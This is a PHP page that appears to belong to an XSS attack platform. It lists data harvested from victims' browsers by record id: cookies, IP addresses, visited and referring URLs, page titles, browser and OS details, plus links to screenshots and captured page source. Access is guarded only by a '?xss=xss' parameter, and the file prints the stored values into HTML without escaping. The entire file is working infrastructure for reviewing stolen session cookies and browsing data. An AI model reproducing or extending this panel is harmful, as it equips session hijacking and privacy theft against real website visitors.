<?php
	header("Content-Type: text/html;charset=utf-8");
	include 'conn.php';
	$mysqli = new mysqli();
	$mysqli->connect($host,$dbuser,$dbpass,$dbname);
	$id = $_GET['id'];
	if($_GET['xss']!='xss'){
		die();
	}
	$sql = "select * from xssdata where id ='".mysqli_real_escape_string($mysqli,$id)."'";
	$rs = $mysqli->query($sql);
?>
详细数据：<hr><br>
<table cellspacing="15">
<?php 
	while($row = $rs->fetch_assoc()){
		$data = json_decode($row['information']);
		echo "<tr>";
		echo "<td>screen</td>";
		echo "<td><a href='./xss/".$id.".png'>ClickMe</a></td>";
		echo "</tr>";
		echo "<tr>";
		echo "<td>time</td>";
		echo "<td>".$data->time."</td>";
		echo "</tr>";
		echo "<tr>";
		echo "<td>ip</td>";
		echo "<td>".$data->ip."</td>";
		echo "</tr>";
		echo "<tr>";
		echo "<td>url</td>";
		echo "<td>".$data->url."</td>";
		echo "</tr>";
		echo "<tr>";
		echo "<td>referer</td>";
		echo "<td>".$data->referer."</td>";
		echo "</tr>";
		echo "<tr>";
		echo "<td>topurl</td>";
		echo "<td>".$data->topUrl."</td>";
		echo "</tr>";
		echo "<tr>";
		echo "<td>title</td>";
		echo "<td>".$data->title."</td>";
		echo "</tr>";
		echo "<tr>";
		echo "<td>cookie</td>";
		echo "<td>".$data->cookie."</td>";
		echo "</tr>";
		echo "<td>browser</td>";
		echo "<td>".$data->browser->browser."<br>".$data->browser->ver."</td>";
		echo "</tr>";
		echo "<td>os</td>";
		echo "<td>".$data->os."</td>";
		echo "</tr>";
		echo "<td>source</td>";
		echo "<td><a href='./xss/".$id.".txt'>ClickMe</a></td>";
		echo "</tr>";
	}
?>
</table>
